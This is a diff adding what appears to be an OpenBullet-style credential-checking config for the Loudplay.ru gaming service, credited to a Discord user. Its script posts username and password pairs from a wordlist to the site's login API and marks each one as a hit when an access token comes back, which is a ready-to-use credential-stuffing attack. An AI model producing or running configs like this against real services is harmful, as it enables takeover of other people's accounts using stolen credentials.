@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "Loudplay.ru",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-24T10:37:38.3200809+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api.loudplay.ru/auth/v1/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Origin: https://my.loudplay.ru" 
+  HEADER "Referer: https://my.loudplay.ru/login?next=%2Fpurchase&roistat_visit=228169" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "unauthorizedUser" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
